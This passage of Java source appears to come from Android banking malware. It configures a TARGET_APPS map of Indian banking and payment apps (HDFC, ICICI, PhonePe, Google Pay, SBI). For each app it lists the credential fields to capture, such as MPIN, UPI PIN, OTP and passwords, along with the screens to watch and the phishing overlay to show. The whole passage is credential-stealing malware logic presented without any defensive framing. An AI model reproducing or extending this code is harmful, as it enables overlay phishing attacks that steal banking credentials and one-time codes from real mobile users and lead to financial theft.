            "sbi_overlay"
        ));
        
        TARGET_APPS.put("com.hdfc.bank", new BankingAppConfig(
            "HDFC Bank",
            new String[]{"mpin", "ipin", "password", "otp"},
            new String[]{"login", "netbanking", "transfer", "billpay"},
            "hdfc_overlay"
        ));
        
        TARGET_APPS.put("com.icici.bankapp", new BankingAppConfig(
            "ICICI Bank iMobile",
            new String[]{"userid", "password", "mpin", "otp"},
            new String[]{"login", "transfer", "imps", "recharge"},
            "icici_overlay"
        ));
        
        TARGET_APPS.put("com.phonepe.app", new BankingAppConfig(
            "PhonePe",
            new String[]{"upiPin", "password", "mpin", "otp"},
            new String[]{"sendmoney", "recharge", "billpay", "scanpay"},
            "phonepe_overlay"
        ));
        
        TARGET_APPS.put("com.google.android.apps.nbu.paisa.user", new BankingAppConfig(
            "Google Pay",
            new String[]{"upiPin", "googlePassword", "otp"},
            new String[]{"payment", "send", "request", "recharge"},
            "gpay_overlay"
        ));
        
        TARGET_APPS.put("in.org.npci.upiapp", new BankingAppConfig(
